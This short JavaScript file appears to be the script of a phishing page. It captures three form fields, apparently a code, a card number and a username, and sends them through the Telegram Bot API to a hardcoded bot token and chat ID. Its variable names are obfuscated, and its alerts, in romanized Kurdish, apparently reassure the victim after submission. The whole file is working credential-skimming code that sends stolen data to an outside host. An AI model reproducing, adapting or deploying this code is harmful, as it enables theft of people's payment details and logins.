const bot = {TOKEN: "5494257162:AAH6bBIUVBtq-xzx3JWpjpR_bNU-OwzP95g", chatID: "5538462835"};
const form = document.querySelector("#form").addEventListener("submit", _0x4e13x3 => {
  _0x4e13x3.preventDefault();
  const _0x4e13x4 = document.querySelector("#cod").value;
  const _0x4e13x5 = document.querySelector("#kart").value;
  const _0x4e13x6 = document.querySelector("#user").value;
  const _0x4e13x7 = "Hi! This is my photo!";
  fetch(`${"https://api.telegram.org/bot"}${bot.TOKEN}${"/sendMessage?chat_id="}${bot.chatID}${"&text="}${_0x4e13x4}${" "}${_0x4e13x5}${" "}${_0x4e13x6}${""}`).then(_0x4e13x8 => {
    console.log(_0x4e13x8);
    alert("SPAS BO HALBZHARDNY KURD DAV BA ZW TREN KAT WALAMT ADAYNAWA");
  }, _0x4e13x9 => {
    console.log(_0x4e13x9);
    alert("HALAYA RWY DA BBWRAY KAWA");
  });
});
